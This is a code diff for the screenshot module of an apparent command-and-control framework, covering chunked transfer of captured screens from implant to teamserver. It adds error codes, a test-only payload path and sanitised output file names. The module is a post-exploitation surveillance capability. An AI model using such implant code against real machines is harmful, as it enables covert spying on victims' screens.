@@ -83,6 +83,7 @@ int ScreenShot::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
 
 #define ERROR_OPEN_FILE 1
 #define ERROR_CAPTURE_SCREEN 2
+#define ERROR_UNSUPPORTED_PLATFORM 3
 
 int ScreenShot::emitChunk(C2Message& c2RetMessage)
 {
@@ -90,13 +91,14 @@ int ScreenShot::emitChunk(C2Message& c2RetMessage)
         return 0;
 
     const std::size_t totalSize = m_screenshotBuffer.size();
-    const std::size_t chunkSize = std::min(CHUNK_SIZE, totalSize - m_bytesSent);
+    const std::size_t chunkSize = (std::min)(CHUNK_SIZE, totalSize - m_bytesSent);
     c2RetMessage.set_instruction(std::to_string(moduleHash));
     c2RetMessage.set_cmd("");
     c2RetMessage.set_uuid(m_taskUuid);
     c2RetMessage.set_outputfile(m_outputfile);
     c2RetMessage.set_args(m_bytesSent == 0 ? "0" : "1");
     c2RetMessage.set_data(m_screenshotBuffer.data() + m_bytesSent, chunkSize);
+    c2RetMessage.set_errorCode(0);
 
     m_bytesSent += chunkSize;
     if (m_bytesSent == totalSize)
@@ -118,9 +120,23 @@ int ScreenShot::emitChunk(C2Message& c2RetMessage)
 
 int ScreenShot::process(C2Message &c2Message, C2Message &c2RetMessage)
 {
+    c2RetMessage.set_data(std::string{});
+    c2RetMessage.set_returnvalue({});
     c2RetMessage.set_instruction(c2Message.instruction());
     c2RetMessage.set_outputfile(c2Message.outputfile());
     c2RetMessage.set_args("0");
+
+#if defined(C2CORE_SCREENSHOT_TEST_PAYLOAD)
+    if (!c2Message.data().empty())
+    {
+        m_outputfile = c2Message.outputfile();
+        m_taskUuid = c2Message.uuid();
+        m_screenshotBuffer = c2Message.data();
+        m_bytesSent = 0;
+        emitChunk(c2RetMessage);
+        return 0;
+    }
+#endif
 
 #ifdef _WIN32
     std::vector<unsigned char> dataScreen;
@@ -137,15 +153,8 @@ int ScreenShot::process(C2Message &c2Message, C2Message &c2RetMessage)
     m_screenshotBuffer.assign(dataScreen.begin(), dataScreen.end());
     m_bytesSent = 0;
     emitChunk(c2RetMessage);
-#elif defined(C2CORE_BUILD_TESTS)
-    if (!c2Message.data().empty())
-    {
-        m_outputfile = c2Message.outputfile();
-        m_taskUuid = c2Message.uuid();
-        m_screenshotBuffer = c2Message.data();
-        m_bytesSent = 0;
-        emitChunk(c2RetMessage);
-    }
+#else
+    c2RetMessage.set_errorCode(ERROR_UNSUPPORTED_PLATFORM);
 #endif
 
     return 0;
@@ -154,7 +163,8 @@ int ScreenShot::process(C2Message &c2Message, C2Message &c2RetMessage)
 
 int ScreenShot::errorCodeToMsg(const C2Message &c2RetMessage, std::string& errorMsg)
 {
-#ifdef BUILD_TEAMSERVER
+#if defined(BUILD_TEAMSERVER) || defined(C2CORE_BUILD_TESTS)
+    errorMsg.clear();
     int errorCode = c2RetMessage.errorCode();
     if(errorCode>0)
     {
@@ -162,6 +172,8 @@ int ScreenShot::errorCodeToMsg(const C2Message &c2RetMessage, std::string& error
             errorMsg = "Failed: Couldn't open file";
         else if(errorCode==ERROR_CAPTURE_SCREEN)
             errorMsg = "Failed: screen capture returned no data";
+        else if(errorCode==ERROR_UNSUPPORTED_PLATFORM)
+            errorMsg = "Failed: screen capture is unavailable on this platform";
     }
 #endif
     return 0;
@@ -196,7 +208,9 @@ int ScreenShot::recurringExec(C2Message& c2RetMessage)
 // TODO save the screenshot in a pre defined directory
 int ScreenShot::followUp(const C2Message &c2RetMessage)
 {
-#ifdef BUILD_TEAMSERVER
+#if defined(BUILD_TEAMSERVER) || defined(C2CORE_BUILD_TESTS)
+    if (c2RetMessage.errorCode() != 0)
+        return 0;
     if(!c2RetMessage.outputfile().empty())
         return 0;
 
@@ -204,10 +218,37 @@ int ScreenShot::followUp(const C2Message &c2RetMessage)
 
     if(buffer.size()>0)
     {
-        std::string outputFile = "screenShot" + getFilenameTimestamp() + ".png";
-        std::ofstream output(outputFile, std::ios::binary);
-        output << buffer;
-        output.close();
+        std::string outputFile;
+        if (!c2RetMessage.uuid().empty())
+        {
+            if (c2RetMessage.uuid().size() > 80)
+                return -1;
+            std::string safeUuid;
+            for (unsigned char ch : c2RetMessage.uuid())
+            {
+                if ((ch >= 'a' && ch <= 'z') || (ch >= 'A' && ch <= 'Z')
+                    || (ch >= '0' && ch <= '9') || ch == '-' || ch == '_')
+                    safeUuid.push_back(static_cast<char>(ch));
+                else
+                    safeUuid.push_back('_');
+            }
+            outputFile = "screenShot" + safeUuid + ".png";
+        }
+        else
+        {
+            if (c2RetMessage.args() == "1")
+                return -1;
+            outputFile = "screenShot" + getFilenameTimestamp() + ".png";
+        }
+        const auto mode = c2RetMessage.args() == "1"
+            ? std::ios::binary | std::ios::app
+            : std::ios::binary | std::ios::trunc;
+        std::ofstream output(outputFile, mode);
+        if (!output)
+            return -1;
+        output.write(buffer.data(), static_cast<std::streamsize>(buffer.size()));
+        if (!output)
+            return -1;
     }
 #endif
 
